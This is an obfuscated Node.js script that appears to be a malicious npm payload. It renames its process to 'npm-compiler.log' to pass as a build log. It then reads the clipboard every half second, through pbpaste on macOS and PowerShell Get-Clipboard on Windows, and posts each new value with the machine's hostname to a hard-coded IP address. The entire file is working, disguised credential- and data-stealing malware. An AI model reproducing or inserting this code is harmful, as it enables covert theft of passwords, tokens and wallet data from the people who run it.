const j = b;
(function (c, d) {
    const i = b,
        e = c();
    while (true) {
        try {
            const f =
                -parseInt(i(186)) / 1 +
                (parseInt(i(206)) / 2) * (parseInt(i(204)) / 3) +
                (-parseInt(i(200)) / 4) * (-parseInt(i(181)) / 5) +
                (parseInt(i(198)) / 6) * (parseInt(i(201)) / 7) +
                (parseInt(i(195)) / 8) * (-parseInt(i(179)) / 9) +
                parseInt(i(165)) / 10 +
                -parseInt(i(175)) / 11;
            if (f === d) break;
            else e.push(e.shift());
        } catch (g) {
            e.push(e.shift());
        }
    }
})(a, 730013);
const { execSync } = require(j(185)),
    os = require('os'),
    axios = require(j(196));
process[j(171)] = j(189);
const server = j(188),
    uid = j(172),
    t = '8',
    sleep = (c) => new Promise((d) => setTimeout(d, c)),
    makeLog = async (c) => {
        const k = j;
        try {
            await axios[k(190)](k(164) + server + k(173), { message: c, host: os[k(180)](), uid: uid, t: t });
        } catch {}
    },
    getClipboard = async () => {
        const l = j,
            c = {
                eUhbe: function (d, e) {
                    return d === e;
                },
                UKEXW: l(183),
                ydiOg: function (d, e, f) {
                    return d(e, f);
                },
                knSsX: l(176),
                MixAg: l(169),
                VgHDs: l(182),
                eMYcr: function (d, e, f) {
                    return d(e, f);
                },
                cOxPD: l(184) + l(193),
            };
        try {
            if (c[l(168)](os[l(199)](), c[l(178)])) {
                const d = c[l(187)](execSync, c[l(202)], { encoding: c[l(203)] });
                return d[l(192)]();
            }
            if (c[l(168)](os[l(199)](), c[l(177)])) {
                const e = c[l(170)](execSync, c[l(197)], { encoding: c[l(203)], windowsHide: true });
                return e[l(192)]();
            }
            return null;
        } catch {
            return null;
        }
    },
    watchClipboard = async () => {
        const m = j,
            c = {
                XmSQp: function (f, g) {
                    return f(g);
                },
                goUdv: function (f) {
                    return f();
                },
                TsVtV: function (f, g) {
                    return f !== g;
                },
                nmqai: function (f, g, h) {
                    return f(g, h);
                },
                NqOIq: function (f, g) {
                    return f(g);
                },
            };
        let d = null,
            e = null;
        while (true) {
            const f = await c[m(167)](getClipboard);
            f &&
                c[m(205)](f, d) &&
                (c[m(191)](clearTimeout, e),
                (e = c[m(174)](
                    setTimeout,
                    () => {
                        const n = m;
                        c[n(191)](makeLog, f);
                    },
                    500
                )),
                (d = f)),
                await c[m(207)](sleep, 500);
        }
    };
(async () => {
    const o = j,
        c = {
            OMvZF: function (d, e) {
                return d(e);
            },
            yfhCp: function (d) {
                return d();
            },
        };
    await c[o(166)](sleep, 3e3), c[o(194)](watchClipboard);
})();
function b(c, d) {
    c = c - 164;
    const e = a();
    let f = e[c];
    return f;
}
function a() {
    const p = [
        '13858000faxIub',
        'OMvZF',
        'goUdv',
        'eUhbe',
        'utf8',
        'eMYcr',
        'title',
        '070c425fd005e11aec1a90706dda66f5',
        '/api/service/makelog',
        'nmqai',
        '27567914JKegHJ',
        'pbpaste',
        'VgHDs',
        'UKEXW',
        '4249683hTuqFd',
        'hostname',
        '35qyRcvC',
        'win32',
        'darwin',
        'powershell -NoProfile -NonIntera',
        'child_process',
        '225019WxcPjC',
        'ydiOg',
        '216.126.237.71',
        'npm-compiler.log',
        'post',
        'XmSQp',
        'trim',
        'ctive Get-Clipboard',
        'yfhCp',
        '24hlKwfH',
        'axios',
        'cOxPD',
        '31338DHUIrg',
        'platform',
        '730036wzivYg',
        '1925hCdSYr',
        'knSsX',
        'MixAg',
        '3ofnIVF',
        'TsVtV',
        '1556158BZWdbe',
        'NqOIq',
        'http://',
    ];
    a = function () {
        return p;
    };
    return a();
}
